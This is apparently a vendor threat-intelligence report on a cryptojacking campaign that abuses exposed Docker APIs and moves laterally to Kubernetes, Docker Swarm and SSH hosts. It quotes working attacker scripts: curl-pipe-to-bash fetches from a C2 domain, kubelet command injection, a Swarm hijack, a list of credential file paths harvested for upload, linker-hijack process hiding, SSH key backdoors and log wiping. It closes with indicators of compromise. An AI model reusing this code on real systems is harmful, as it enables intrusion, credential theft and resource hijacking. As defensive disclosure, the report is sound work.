@@ -1,0 +1,446 @@
+
+Key points and observations
+
+We have discovered a new cryptojacking campaign targeting Docker Engine API, with the ability to move laterally to Docker Swarm, Kubernetes, and SSH servers.
+We witnessed the threat actor joining compromised hosts in a threat actor-controlled Docker Swarm cluster, which enabled them to use Docker Swarm's orchestration features for command and control (C2) purposes.
+The campaign leverages Docker Hub, where the threat actor is hosting a number of malicious images. These images were still live at the time of writing.
+Hardcoded file system paths present in the payloads suggest targeting of compute infrastructure used for GitHub Codespaces.
+Attack flow
+Overview
+Datadog Security Research recently discovered a new malware campaign targeting microservice technologies, namely Docker and Kubernetes. The campaign exploits Docker for initial access, deploying a cryptocurrency miner on infected containers before retrieving and executing a number of malicious payloads.
+These payloads are dedicated to lateral movement from the infected container to related hosts running Docker, Kubernetes, or SSH. One such payload is used to identify and compromise Kubernetes’ kubelet API. The kubelet API provides a way to programmatically manage pods (logical groups of containers) within a Kubernetes node. If compromised, a threat actor can use this API endpoint to deploy additional resources and execute malware on the containers themselves.
+Analysis of this campaign also revealed a Docker Hub user operated by the threat actors with the username nmlmweb3. It’s not the first time Docker’s container registry has been used to distribute malware, but this particular user and their repositories have yet to be discussed in public reporting.
+In addition to the payloads deployed in this attack, we discovered even more tooling used by this threat actor. Enumeration of an open web directory in the threat actor’s Command and Control (C2) server revealed a number of additional malware samples, demonstrating their targeting of Docker Swarm. Another Docker Hub user and associated repositories were also discovered.
+Initial access
+The attack begins with a malicious command the threat actors used against Docker API endpoints exposed to the Internet without authentication. This is a common infection vector in cloud environments. Vulnerable endpoints are identified using Internet scanning tools, such as masscan and zgrab, that have been deployed on compromised nodes (compute instances or containers). This allows the group's malware to propagate in a worm-like fashion, allowing lateral movement across cloud infrastructure.
+Once a vulnerable endpoint has been identified, the malware uses the Docker API to spawn an Alpine container, mounts the underlying host’s file system inside the container, and executes a shell command to retrieve an initialization script responsible for starting the infection chain.
+"Cmd": [  
+    "chroot",  
+    "/mnt",  
+    "/bin/sh",  
+    "-c",  
+    "curl -sL4 http://solscan.live/sh/init.sh | bash;"  
+  ],
+Malicious shell command used to retrieve initialisation script
+…  
+"HostConfig": {  
+    "Binds": ["/:/mnt"],  
+…
+Binding the Docker host’s file system to a mount point in the container
+Actions on objective
+init.sh
+The initialization script (init.sh) prepares the container for additional compromise by first ensuring that data transfer tools such as curl and wget are installed. The malware then determines if it’s running as the root user and, if so, proceeds to retrieve the official XMRig setup script from GitHub and execute it with the following XMRig User string (T1496):
+4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
+To conceal the process after execution, the script retrieves a process hider compiled as a Linux shared object file from the C2 server and saves it as /etc/rig.so. The shared object is then registered with the dynamic linker by echoing its path into the file /etc/ld.so.preload. This ensures that the file is executed every time another binary on the system is executed, a technique known as Dynamic Linker Hijacking (T1574.006).
+The process hider itself is a custom fork of libprocesshider, with the process name of xmrig hardcoded. Executing this via Dynamic Linker Hijacking means that the process hider will always be running in the background, ensuring that anything with the name xmrig is hidden from process listing tools such as top and ps.
+init.sh finishes by retrieving a number of additional payloads from the C2 and executing them in memory by either piping them through bash or sh. These payloads will be discussed in the coming sections. The malware also retrieves a custom version of XMRig if the user is non-root and saves this as /var/tmp/dockerd before executing it. This technique is used as an alternative attempt to disguise the XMRig process in situations where the user is non-root, as root privileges are required to write to /etc/ld.so.preload.
+…
+wget https://solscan.live/so/xmrig.so -O /etc/rig.so && echo "/etc/rig.so" >> /etc/ld.so.preload
+
+wget -O - https://solscan.live/sh/kube.lateral.sh | bash &
+if [ -f "/root/.ssh/id_rsa" ]; then wget -O - https://solscan.live/sh/spread_ssh.sh | bash ; fi
+wget -O - https://solscan.live/sh/spread_docker_local.sh | bash &
+…
+Excerpt from init.sh showing Dynamic Linker Hijacking and retrieval of additional payloads
+Lateral movement
+kube.lateral.sh
+kube.lateral.sh is the first of three scripts executed by init.sh that are responsible for lateral movement. As the name suggests, kube.lateral.sh specifically targets Kubernetes and begins by deploying a number of common defense impairment techniques (T1562.004), summarized here:
+
+Disabling the system firewall
+Updating /etc/resolv.conf to use public DNS resolvers (ensuring DNS requests made by the malware will resolve successfully)
+Removing monitoring agents from the host, including those used in Alibaba Cloud and Tencent Cloud
+Clearing the syslog
+Stopping the AppArmor service and disabling SELinux
+If the Alpine Package Keeper (apk) is available in the container, the malware will retrieve masscan as an RPM package and install it using the apk command line utility. Otherwise, masscan is cloned from the official GitHub repository and compiled on delivery (T1027.004). zgrab is installed in a similar manner.
+The malware then searches for the directory /root/.kube, which contains client and root certificates for accessing a Kubernetes cluster with kubectl. If this isn’t found, a function named setup_ircbot is called. However, this function isn’t implemented in the version of the script we analyzed. Similarly, the malware will search for the file /usr/sbin/ps. If not found, a UPX-packed fork of XMRig is retrieved from the C2 and saved to this path. The XMRig fork contains a hardcoded password KubePwn to connect to the mining pool. Code to retrieve another shell script named aws.sh is also included. However, the C2 wasn’t serving this script at the time of analysis.
+The rest of the script is dedicated to lateral movement to Kubernetes. The malware uses masscan to search for nodes with port 10250 (the Kubelet API) open in randomized subnets within various local area network (LAN) address ranges. These ranges include the following:
+
+10.0.0.0/8
+172.16.0.0/12
+192.168.0.0/16
+169.254.0.0/16
+100.64.0.0/10
+If an IP is found with the target port open, a request is made to the /runningpods/ endpoint of the kubelet API, and the script will use jq to parse the namespace, pod name, and container name for containers running within pods on the Kubernetes host. If successful, the malware reports this back to the C2 via an HTTP GET request to a URL with the parameter ?target=<ip>:
+curl -sLk https://solscan.live/up/kube_in.php?target=$theip
+For each container discovered, bash is installed along with curl and wget. These are then used to retrieve the payload setup_xmr.sh and save it as /tmp/.x1mr (if wget is used) or /tmp/.x2mr (if curl is used).
+Note that the Kubernetes lateral movement techniques described above are very similar to those reported by Trend Micro in a campaign attributed to TeamTNT in May 2021.
+kube_pwn() {
+    LRANGE=$1
+    rndstr=$(
+        head /dev/urandom | tr -dc a-z | head -c 6
+        echo ''
+    )
+    eval "$rndstr"="'$(masscan --open -p10250 $LRANGE --rate=250000 | awk '{print $6}')'"
+    for ipaddr in ${!rndstr}; do
+        if [ -f $TEMPFILE ]; then rm -f $TEMPFILE; fi
+        timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' >>$TEMPFILE
+        KUBERES=$?
+        if [ "$KUBERES" = "0" ]; then
+            curl -sLk https://solscan.live/up/kube_in.php?target=$theip
+            while read namespace podname containername; do
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt update --fix-missing"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk update"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y bash"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y wget"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y curl"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y bash"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y wget"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y curl"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add bash"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget "$INITPLOAD" -O /tmp/.x1mr"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl "$INITPLOAD" -o /tmp/.x2mr"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr"
+                timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr"
+            done <$TEMPFILE
+            rm -rf $TEMPFILE
+        fi
+    done
+}
+
+LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")
+for LRANGE in ${LAN_RANGES[@]}; do kube_pwn $LRANGE; done
+Kubernetes lateral movement functionality
+spread_docker_local.sh
+To aid lateral movement to Docker endpoints in addition to Kubernetes, init.sh executes another shell script named spread_docker_local.sh. This script uses masscan and zgrab to scan the same LAN ranges described above for nodes with ports 2375, 2376, 2377, 4244, and 4243 open. These ports are associated with either Docker Engine or Docker Swarm.
+For masscan, the threat actor uses the --router-mac parameter with the value 66-55-44-33-22-11 to limit the scan to local network devices. An example of the scanning commands for masscan and zgrab can be seen below:
+eval "$rndstr"="'$(masscan --router-mac 66-55-44-33-22-11 $range -p$port --rate=$rate | awk '{print $6}'| zgrab --senders 200 --port $port --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
+For any IPs discovered with the target ports open, the malware attempts to spawn a new container with the name alpine. This container is based on an image named upspin, hosted on Docker Hub by the user nmlmweb3. At the time of writing, this malicious user was still active in Docker Hub and had six repositories listed under their account.
+The Docker image tag that’s used to retrieve the image from Docker Hub is specified by the threat actor's C2 server by using a text file pulled to the compromised host at the beginning of the script. This allows the threat actors to easily update the campaign with a new malicious image should the existing one be taken down.
+PWNTAINER=$(curl -s https://solscan.live/data/docker.container.local.spread.txt)
+Command to retrieve the Docker image tag from the C2 server and store it in the variable PWNTAINER
+At the time of writing, the upspin image simply executes the init.sh script covered previously. An additional container is also spawned on discovered hosts, this time based on the vanilla Alpine Linux image. In the same command used to spawn the container, the threat actor installs bash, curl, and wget before retrieving the init.sh script from the C2 and executing it in memory by piping through sh.
+for ipaddy in ${!rndstr}; do
+  timeout -s SIGKILL 120 docker -H $TARGET run -d --network host --privileged --name alpine -v /:/host $PWNTAINER & 
+  timeout -s SIGKILL 240 docker -H $TARGET run -d --network host --privileged -v /:/mnt alpine sh -c 'apk update; apk add bash curl wget; apt update; apt install -y  bash curl wget; yum install -y  bash curl wget; wget -q -O - $PWNWWWLNK | sh || curl -s $PWNWWWLNK | sh' &
+done
+Commands used to spawn malicious containers on discovered Docker hosts
+spread_ssh.sh
+In addition to targeting Kubernetes and Docker, the threat actors use a third shell script—named spread_ssh.sh—to identify and compromise SSH servers on the local network. This script is also executed directly in memory by init.sh.
+The script first checks for an infection marker in the form of a file located at the path /var/tmp/.alsp. If this file isn’t present, the malware prints a series of hash characters and makes a silent HTTP GET request to the IP 147[.]75.47.199 using curl. This IP was previously attributed to TeamTNT by Intezer in 2022. If the file is found, the script echos replay .. i know this server … before exiting.
+spread_ssh.sh then retrieves pnscan as a tar archive from the C2 server, which is used instead of masscan or zgrab to scan the LAN for hosts with port 22 open. The command ip route show is used to determine the subnet in which the current node resides, to be used for scanning. After parsing the output of this command, the results are stored in a file at the path /home/hilde/.ssh/.ranges and the scan results are stored in /home/hilde/.ssh/.known_hosts. The malware also attempts to discover known hosts by searching for SSH commands and IP addresses in shell history, in addition to searching for SSH private keys to be used in connection attempts.
+For any discovered SSH servers, the script will connect to each in turn and attempt to use SSH remote command invocation to spread a copy of itself to the target host. This is achieved by using curl to retrieve the payload on the target host and executing it directly in memory by piping through sh.
+Two additional scripts are executed by spread_ssh.sh—search.sh and setup_xmr.sh (covered in the Resource Hijacking section). The first, named search.sh, defines an SSH key to be used by the threat actors to connect to the existing compromised host. It also creates a new user named ftp and assigns the user a password of Nmlmtcg1999$, allowing the threat actors to maintain access to the compromised host.
+search.sh also hunts for credential files associated with cloud and other networked services by using an array of hardcoded paths:
+declare -a PATH_ARRAY=(
+    "/home/codespace/.ssh/id_rsa"
+    "/home/codespace/.ssh/id_rsa.pub"
+    "/home/codespace/.ssh/known_hosts"
+    "/home/codespace/.ssh/config"
+    "/home/codespace/.ssh/authorized_keys"
+    "/home/codespace/.ssh/authorized_keys2"
+    "/home/codespace/.aws/config"
+    "/home/codespace/.aws/credentials"
+    "/home/codespace/.aws/credentials.gpg"
+    "/home/codespace/.docker/config.json"
+    "/home/codespace/.docker/ca.pem"
+    "/home/codespace/.s3backer_passwd"
+    "/home/codespace/s3proxy.conf"
+    "/home/codespace/.s3ql/authinfo2"
+    "/home/codespace/.passwd-s3fs"
+    "/home/codespace/.s3cfg"
+    "/home/codespace/.git-credentials"
+    "/home/codespace/.gitconfig"
+    "/home/codespace/.shodan/api_key"
+    "/home/codespace/.ngrok2/ngrok.yml"
+    "/home/codespace/.purple/accounts.xml"
+    "/home/codespace/.config/filezilla/filezilla.xml"
+    "/home/codespace/.config/filezilla/recentservers.xml"
+    "/home/codespace/.config/hexchat/servlist.conf"
+    "/home/codespace/.config/monero-project/monero-core.conf"
+    "/home/codespace/.boto"
+    "/home/codespace/.netrc"
+    "/home/codespace/.config/gcloud/access_tokens.db"
+    "/home/codespace/.config/gcloud/credentials.db"
+    "/home/codespace/.davfs2/secrets"
+    "/home/codespace/.pgpass"
+    "/home/codespace/.local/share/jupyter/runtime/notebook_cookie_secret"
+    "/home/codespace/.smbclient.conf"
+    "/home/codespace/.smbcredentials"
+    "/home/codespace/.samba_credentials"
+)
+These paths indicate that the threat actor intends to target compute instances used for GitHub’s Codespaces remote development feature. If any files are discovered at these paths, the script bundles them into a tar archive and uploads them to the following C2 endpoint: https://solscan[.]live/upload.php.
+Resource hijacking
+Both the Kubernetes and SSH lateral movement payloads deploy an additional script named setup_xmr.sh, which is used to retrieve and execute the XMRig cryptocurrency miner. This payload is also hosted on the threat actor’s C2 server, along with the XMRig binary itself. setup_xmr.sh saves the XMRig binary as /var/tmp/.system, before changing into the directory and executing the miner with the following parameters:
+
+Mining pool: pool.supportxmr.com:3333
+Username: 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
+Mining pool password: GesichtsKirmes (translates to “FaceFair” from German)
+In addition to this, another script named spread_kube_loop.sh is retrieved and executed. This script contains Kubernetes lateral movement code with similar functionality to that described in the analysis of kube.lateral.sh, the only exception being that the scan ranges are not limited to the LAN.
+C2 enumeration and additional payloads
+After analyzing the payloads described above, we discovered that the web server behind the solscan[.]live domain—used for payload delivery throughout this campaign—was exposing a publicly accessible web directory. We enumerated this directory and discovered additional payloads belonging to the threat actor.
+These included:
+
+ar.sh, a variant of init.sh
+TDGINIT.sh
+pdflushs.sh
+Passive C2 enumeration led to the discovery of ar.sh, a variant of init.sh that modifies iptables rules and adjusts system configurations to evade detection. ar.sh also clears logs and cron jobs, replacing them with malicious entries to ensure the miner’s uninterrupted operation.
+iptables -F systemctl stop firewalld 2>/dev/null 1>/dev/null systemctl disable firewalld 2>/dev/null 1>/dev/null service iptables stop 2>/dev/null 1>/dev/null ulimit -n 65535 2>/dev/null 1>/dev/null
+Modification of iptables
+localgo() {
+  echo > /var/spool/mail/root
+  echo > /var/log/wtmp
+  echo > /var/log/secure
+  if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
+    for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do 
+      ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'curl -o-  ${mainurl/b.sh} | bash >/dev/null 2>&1 &' & 
+    done
+  fi
+}
+Clearing local logs and lateral movement to SSH known hosts
+ar.sh also differed from init.sh in its delivery of libprocesshider. Instead of retrieving the compiled binary from the C2 server, the threat actor decodes an inline base64-encoded version of the process hider’s source code before compiling it on delivery.
+Similar to the scripts described above, TDGINIT.sh starts downloading the required tools, including curl, wget, bash, masscan, jq, and docker, from its C2 server http://solscan[.]live/bin/zgrab.  It also performs a masscan scan targeting specific ports, such as 2375, 2376, and 4243. For each identified host, it uploads its findings to its C2 server wget -q "http://solscan[.]live/incoming/docker.php?dockerT=$IPADDR:$PORT" . Additionally, it executes a series of malicious commands, including downloading and running Docker containers, such as xululol/unminerxmr.
+One interesting tactic used by the script is its manipulation of Docker Swarm. After compromising a Docker host, the script forces the host to leave any existing Swarm, only to join a new Swarm controlled by the threat actor using a predefined token. This allows the threat actor to expand their control over multiple Docker instances in a coordinated fashion, effectively turning compromised systems into a botnet for further exploitation. This is the first time Datadog Security Research has observed the manipulation of Docker Swarm.
+DOCKER_GATLING_GUN(){
+  PORT=$1
+  RATE=$2
+  RANGE=$3
+  rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
+  eval "$rndstr"="'$(masscan -p$PORT $RANGE.0.0.0/8 --rate=$RATE | awk '{print $6}'| zgrab --senders 200 --port $PORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'";
+  for IPADDR in ${!rndstr}; do 
+    echo "$IPADDR:$PORT"
+    wget -q "http://solscan.live/incoming/docker.php?dockerT=$IPADDR:$PORT" -O /dev/null
+    timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt xululol/unminerxmr 
+    timeout -s SIGKILL 120 docker -H tcp://$IPADDR:$PORT run -d --privileged --net host -v /:/mnt alpine sh -c 'apk update; apt-get update ; yum clean all ; apk add bash wget ; apt-get install -y bash wget ; yum install -y bash wget ; wget -O -  http://solscan.live/chimaera/sh/init.sh | sh || curl  http://solscan.live/chimaera/sh/init.sh | bash' &
+    timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm leave --force
+    timeout -s SIGKILL 30 docker -H tcp://$IPADDR:$PORT swarm join --token SWMTKN-1-5boro95fiuswddse7fpl7nzpavv3xon3xpbynelcrtnu7vqggt-cd9rfe6vsjsw7gdq1cq5nspw4 164.68.106[.]96:2377
+  done;
+}
+Docker Swarm manipulation
+This snippet illustrates how the script forces Docker instances to join a malicious Docker Swarm controlled by the threat actor at 164.68.106.96.
+In addition to ar.sh and TDGINIT.sh, we also encountered a script named pdflushs.sh. The script installs a persistent backdoor by appending a threat-actor-controlled SSH key to the /root/.ssh/authorized_keys file. This backdoor is protected using chattr +ai, which makes the file immutable, preventing removal or modification. If the key is missing or the immutability is disabled, the script reinstates the key and reapplies the immutable flag, ensuring the backdoor remains intact.
+checkBackdoor(){
+   $busybox chattr +ai /root/.ssh/authorized_keys
+   if ! $busybox grep -q "paDKiUwmHNUSW7E1S18Cl" /root/.ssh/authorized_keys
+   then
+       $busybox echo "ssh-rsa AAAAB3..." > /root/.ssh/authorized_keys
+       $busybox chattr +ai /root/.ssh/authorized_keys
+   fi
+}
+The script establishes communication with the same C2 server located at solscan[.]live to check for updates to its components. By downloading the SHA-512 hash of various malware files from the server, it compares them with the local versions. If any discrepancies are found, the script fetches and installs the updated components. Datadog Security Research has started observing an increase in malicious software validation and process termination of other malicious software, which hints at a potential turf conflict among threat actors.
+download2() {
+  $WGET $DIR/solscan https://solscan[.]live/chimaera/bin/xmr/x86_64
+  chmod +x $DIR/solscan
+  if [ -x "$(command -v md5sum)" ]; then
+    sum=$(md5sum $DIR/solscan | awk '{ print $1 }')
+    echo $sum
+    case $sum in
+    154c26c9ddc84930f2acd899cd182916)
+      echo "solscan OK"
+      ;;
+    *)
+      echo "solscan wrong"
+      download3
+      ;;
+    esac
+  else
+    echo "No md5sum"
+    download3
+  fi
+}
+Validating integrity of XMR
+checkUpdate(){
+    remoteXmrigSha512=`$busybox wget http://$remoteIp/sha512/xmrig -O - -q`
+    localXmrigSha512=`$busybox sha512sum $xmrig | $busybox awk '{print $1}'`
+    if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]
+    then
+        $busybox wget http://$remoteIp/update/xmrig -O $xmrig
+    fi
+}
+Checking for updates
+To maintain persistence, the script leverages cron jobs, using the hidden libgc++.so file as a cron daemon. It ensures that the cron process is always running and restarts it if necessary. Additionally, the cron job itself is checked regularly to ensure it hasn’t been modified or removed.
+checkCronProc(){
+   if [[ `$busybox ps | $busybox grep "libgc++.so" | $busybox grep -v grep | $busybox wc -l` != 1 ]]
+   then
+       nohup $cron > /dev/null &
+   fi
+}
+Attribution
+Several tactics, techniques and procedures used throughout this campaign overlap with those attributed to TeamTNT. The group is well-known for targeting microservice technologies commonly deployed in cloud environments, including Docker and Kubernetes.
+Additionally, payloads from the current campaign include multiple references to infrastructure and artifacts from previous campaigns. init.sh contains commented-out references to borg[.]wtf, a domain attributed to TeamTNT by Unit42 in 2021. Similarly, setup_xmr.sh contains commented-out references to the IP 45[.]9[.]148[.]35, also attributed to TeamTNT by Unit42.
+Despite these similarities, at the time of writing we found no overlap in the infrastructure underpinning this campaign and the infrastructure used in our February analysis of TeamTNT activities. In addition, the use of shell script payloads makes it difficult to cluster malware samples based on the use of strings and commented code. It would be trivial for the threat actor to add commented references to TeamTNT infrastructure found in public reporting to these scripts, for example.
+Based on the available evidence, we assign low confidence to the attribution of this campaign. While some indicators suggest a possible link to prior activity, the lack of corroborating evidence prevents a direct conclusion at this time.
+How Datadog can help
+Cloud Security Management (CSM) Threats leverages a real-time eBPF agent to detect various stages of post-exploitation activity, including:
+
+SSH authorized keys modified
+Network utility executed
+DNS lookup for paste site service
+Connection to cryptomining pool
+Docker daemon publicly accessible
+Executable bit added to newly created file
+Conclusion
+This campaign demonstrates that services such as Docker and Kubernetes remain fruitful for threat actors conducting cryptojacking at scale. Payloads dedicated to lateral movement throughout the campaign show an awareness of common deployment scenarios in cloud environments, along with a knowledge of misconfigurations frequently encountered in the wild.
+Despite this, the campaign relies on Docker API endpoints being exposed to the Internet without authentication. While this misconfiguration does occur, it’s likely that this is considered “low-hanging fruit” for threat actors and will attract campaigns of an opportunistic nature. Regardless, the malware’s ability to propagate rapidly means that even if the chances of initial access are relatively slim, the rewards are high enough to keep cloud-focused malware groups motivated enough to continue conducting these attacks.
+Indicators of compromise
+Files:
+docker.container.local.spread.txt (9d02707b895728b4229abd863aa6967d67cd8ce302b30dbcd946959e719842ad
+init.sh (700635abe402248ccf3ca339195b53701d989adb6e34c014b92909a2a1d5a0ff)
+kube.lateral.sh (2514e5233c512803eff99d4e16821ecc3b80cd5983e743fb25aa1bcc17c77c79)
+search.sh (6157a74926cfd66b959d036b1725a63c704b76af33f59591c15fbf85917f76fa)
+setup_xmr.sh (6f426065e502e40da89bbc8295e9ca039f28b50e531b33293cee1928fd971936)
+spread_docker_local.sh (78ebc26741fc6bba0781c6743c0a3d3d296613cc8a2bce56ef46d9bf603c7264)
+spread_kube_local.sh (e6985878b938bd1fba3e9ddf097ba1419ff6d77c3026abdd621504f5c4186441)
+spread_ssh.sh (d99bd3a62188213894684d8f9b4f39dbf1453cc7707bac7f7b8f484d113534b0)
+x86_64 (505237e566b9e8f4a83edbe45986bbe0e893c1ca4c5837c97c6c4700cfa0930a)
+xmr.sh.sh (e4c4400a4317a193f49c0c53888ec2f27e20b276c2e6ee1a5fd6eacf3f2a0214)
+xmrig (c5391314ce789ff28195858a126c8a10a4f9216e8bd1a8ef71d11c85c4f5175c)
+xmrig.so (0af1b8cd042b6e2972c8ef43d98c0a0642047ec89493d315909629bcf185dffd)
+Domains:
+solscan.live
+​​x.solscan.live
+IP addresses:
+164.68.106[.]96
+URLs:
+http://192[.]155[.]94[.]199/sh/xmr[.]sh[.]sh
+http://45[.]9[.]148[.]35/aws
+https://solscan[.]live/aws[.]sh
+https://solscan[.]live/bin/64bit/xmrig
+https://solscan[.]live/bin/pnscan_1[.]12+git20180612[.]orig[.]tar[.]gz
+https://solscan[.]live/bin/xmr/x86_64
+https://solscan[.]live/bin/xmrig
+https://solscan[.]live/data/docker[.]container[.]local[.]spread[.]txt
+https://solscan[.]live/input/kube_in[.]php?target=<IP Address>
+https://solscan[.]live/scan_threads[.]dat
+https://solscan[.]live/sh/init[.]sh
+https://solscan[.]live/sh/kube[.]lateral[.]sh
+https://solscan[.]live/sh/search[.]sh
+https://solscan[.]live/sh/setup_xmr[.]sh
+https://solscan[.]live/sh/spread_docker_local[.]sh
+https://solscan[.]live/sh/spread_kube_loop[.]sh
+https://solscan[.]live/sh/spread_ssh[.]sh
+https://solscan[.]live/sh/xmr[.]sh[.]sh
+https://solscan[.]live/so/xmrig[.]so
+https://solscan[.]live/up/kube_in[.]php?target=<IP Address>
+https://solscan[.]live/upload[.]php
+nmlmweb3
+masscan
+zgrab
+
+init.sh
+curl
+wget
+4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
+/etc/rig.so
+/etc/ld.so.preload
+xmrig
+xmrig
+top
+ps
+init.sh
+bash
+sh
+/var/tmp/dockerd
+/etc/ld.so.preload
+
+kube.lateral.sh
+init.sh
+kube.lateral.sh
+/etc/resolv.conf
+masscan
+apk
+masscan
+zgrab
+/root/.kube
+kubectl
+setup_ircbot
+/usr/sbin/ps
+KubePwn
+aws.sh
+masscan
+/runningpods/
+jq
+GET
+?target=<ip>
+bash
+curl
+wget
+setup_xmr.sh
+/tmp/.x1mr
+wget
+/tmp/.x2mr
+curl
+
+init.sh
+spread_docker_local.sh
+masscan
+zgrab
+masscan
+--router-mac
+66-55-44-33-22-11
+masscan
+zgrab
+alpine
+upspin
+nmlmweb3
+PWNTAINER
+upspin
+init.sh
+bash
+curl
+wget
+init.sh
+sh
+
+spread_ssh.sh
+init.sh
+/var/tmp/.alsp
+GET
+curl
+replay .. i know this server …
+spread_ssh.sh
+pnscan
+masscan
+zgrab
+ip route show
+/home/hilde/.ssh/.ranges
+/home/hilde/.ssh/.known_hosts
+curl
+sh
+spread_ssh.sh
+search.sh
+setup_xmr.sh
+search.sh
+ftp
+Nmlmtcg1999$
+search.sh
+https://solscan[.]live/upload.php
+setup_xmr.sh
+setup_xmr.sh
+/var/tmp/.system
+pool.supportxmr.com:3333
+4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9
+GesichtsKirmes
+spread_kube_loop.sh
+kube.lateral.sh
+ar.sh
+init.sh
+TDGINIT.sh
+pdflushs.sh
+ar.sh
+init.sh
+iptables
+ar.sh
+ar.sh
+init.sh
+TDGINIT.sh
+curl
+wget
+bash
+masscan
+jq
+docker
+http://solscan[.]live/bin/zgrab
+wget -q "http://solscan[.]live/incoming/docker.php?dockerT=$IPADDR:$PORT"
+xululol/unminerxmr
+164.68.106.96
+ar.sh
+TDGINIT.sh
+pdflushs.sh
+/root/.ssh/authorized_keys
+chattr +ai
+solscan[.]live
+libgc++.so
+init.sh
+setup_xmr.sh
